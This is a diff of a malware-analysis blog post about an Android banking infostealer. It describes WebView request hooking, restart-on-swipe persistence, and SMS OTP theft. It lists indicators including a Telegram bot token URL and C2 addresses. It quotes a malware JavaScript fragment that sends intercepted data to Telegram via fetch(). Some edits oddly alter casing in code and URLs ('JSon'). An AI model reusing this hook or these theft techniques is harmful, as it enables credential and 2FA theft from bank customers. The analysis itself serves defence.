@@ -1,7 +1,8 @@
 ---
 title: "Salvador Stealer Analysis"
-date: "2026-04-15T19:43:22+03:00"
+date: "2026-04-15"
 draft: false
+tags: ["infostealer", "android", "reversing","malware analysis"]
 ---
 
 ![](/images/image3.png)
@@ -26,22 +27,22 @@ Android Malware analysis
 The Salvador infostealer is an Android malware designed to intercept Indian banking credentials and OTP Tokens by hooking into the device web rendering engine. It utilizes modern Android APIs to remain persistent even when the user attempts to close the application. Additionally, it implements a custom SMS Broadcast receiver to catch live OTP tokens received by SMS which is then used by the malicious actor to impersonate the user.
 
 ### 1. Entry Point: WebView Injection
-The core of the theft occurs within an Android **WebView** (an in-app browser). The malware uses the js function *Eval* to inject a malicious payload that "monkey patches" the standard web environment.
+The core of the theft occurs within an Android **WebView** (an in-app browser). The malware uses the JS function *Eval* to inject a malicious payload that "monkey patches" the standard web environment.
 - **The Hook:** It overwrites the global **XMLHttpRequest.prototype.send** function. This is the primary method used by websites to send data (API calls, form submissions) to their servers.
 - **The Interception:** By sitting between the user and the legitimate server, the malware captures all **POST** data (passwords, cookies, session tokens) before it is encrypted by the website's standard HTTPS transmission.
 
 ### 2. Persistence: The "Unkillable" Service
-To ensure the theft continues indefinitely, the malware implements a watchdog mechanism using the **Android WorkManager API**.
+To ensure the malware continues to operate, it implements a watchdog mechanism using the **Android WorkManager API**.
 - **Task Removal Trigger:** The malware overrides the **onTaskRemoved** method. This is a specific lifecycle event triggered when a user "swipes away" the app from their recent tasks.
 - **The 1-Second Loop:** Instead of shutting down, the app schedules a **OneTimeWorkRequest** to restart its malicious services after a 1 second delay. This makes the malware effectively immune to manual termination by the user.
 
 ### 3. Exfiltration: Telegram Bot API
-Unlike older malware that required a complex Command & Control server, this infostealer leverages the **Telegram Bot API** as its backend.
+Unlike older malware, this infostealer leverages the **Telegram Bot API** as itspart of its backend.
 - **Stealthy Transmission:** Using a hardcoded Bot Token and Chat ID, the malware sends the intercepted data as a standard JSON message to a private Telegram chat controlled by the attacker.
 - **Network Obfuscation:** Because Telegram is a legitimate service, this traffic often bypasses basic network firewalls and does not raise suspicion in standard data usage logs.
 
 ### 4. OTP Interception: SMS Forwarding
-The malware implemented a mechanism to capture OTP authentication tokens received by the banking login 2FA. It uses a permission given by the user to utilize an sms broadcast receiver to capture received SMS’s.
+The malware implements a mechanism to capture OTP authentication tokens received by the banking login 2FA. It uses a permission given by the user to utilize an sms broadcast receiver to capture received SMSs.
 - **Dual-Channel SMS Theft:** The Trojan intercepts all incoming text messages. It simultaneously logs the full message history to the attacker’s web server via **HTTP POST** request and forwards the OTPs to a malicious phone number via SMS.
 - **Dynamic Command & Control:** The malware is not static. it performs an **HTTP GET** request to an attacker controlled URL to retrieve a "Master Phone Number". This allows the hacker to remotely change the destination of stolen codes without needing to reinfect the device, or even automate the process.
 
@@ -57,8 +58,8 @@ The malware implemented a mechanism to capture OTP authentication tokens receive
 | Stage 2 Payload | SHA256 | 7950cc61688a5bddbce3cb8e7cd6bec47eee9e38da3210098f5a5c20b39fb6d8 |
 | Malicious Telegram Bot | URL | https://api[.]telegram[.]org/bot$7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE/sendMessage |
 | Phishgin page | URL |  t15[.]muletipushpa[.]cloud/page/ |
-| OTP interception 1 | URL | https://t15.muletipushpa.cloud/post.php |
-| OTP interception 2 | URL | https://t15[.]muletipushpa[.]cloud/json/number[.]php |
+| OTP interception 1 | URL | https://t15[.]muletipushpa[.]cloud/post.php |
+| OTP interception 2 | URL | https://t15[.]muletipushpa[.]cloud/JSon/number[.]php |
 
 # Anti Analysis Techniques
 ## BadPack
@@ -68,7 +69,7 @@ As part of the Static Analysis, I began using apktool and JADX to decompile the 
 
 The following error *invalid CEN header (bad compression method)* Would not allow me to decompile the file.
 
-I found research conducted by Unit 421 - *‘Beware of BadPack: One Weird Trick Being Used Against Android Devices’* . Feel free to read their research and learn more about the technique.
+I found research conducted by Palo Alto Networks Unit 42 - *‘Beware of BadPack: One Weird Trick Being Used Against Android Devices’* . Feel free to read their research and learn more about the technique.
 
 In short, BadPack is an anti-analysis technique used by Android malware authors to intentionally corrupt APK (ZIP) headers. By mismatching compression methods or sizes between the Local File Header and the Central Directory File Header , malware breaks standard analysis pipelines, reverse-engineering tools, and ZIP parsers. However, the Android runtime ignores these anomalies and executes the malicious payload anyway.
 
@@ -191,7 +192,7 @@ The script hooks the **XMLHttpRequest.prototype.send** function, ensuring that e
             fetch(telegramUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/JSon'
                 },
                 body: JSON.stringify(telegramMessage),
             });
@@ -259,7 +260,7 @@ Once the SMS is captured, the malware triggers two parallel processes: **Bradfor
 ##### A. The Bradford Function (SMS Forwarding)
 This function attempts to turn the victim's device into an automated SMS forwarder by the following order:
 
-1. **Dynamic number Fetching:** It performs an HTTP GET request to **https://t15[.]muletipushpa[.]cloud/json/number[.]php** to retrieve the attacker phone number.  
+1. **Dynamic number Fetching:** It performs an HTTP GET request to **https://t15[.]muletipushpa[.]cloud/JSon/number[.]php** to retrieve the attacker phone number.  
 2. **Configuration Storage:** The returned phone number is saved in SharedPreferences under the file **‘Salvador’** with the key **forwardingNumber**.  
 3. **Forwarding:** The malware then uses the **sendSMS()** method to forward the stolen message directly to this attacker-controlled number.
 
@@ -267,7 +268,7 @@ This function attempts to turn the victim's device into an automated SMS forward
 Serving as a backup, this function ensures data is stolen even if a forwarding number cannot be reached. It operates as the following:
 
 1. **JSON Payload:** It structures the collected Map data into a JSON object.  
-2. **C2 Upload:** It sends an HTTP POST request to **https://t15[.]muletipushpa[.]cloud/post[.]php** with the json object as the body.
+2. **C2 Upload:** It sends an HTTP POST request to **https://t15[.]muletipushpa[.]cloud/post[.]php** with the JSon object as the body.
 
 #### Dynamic Analysis Validation
 To validate the malware behaviour I setup a virtual lab containing the following:
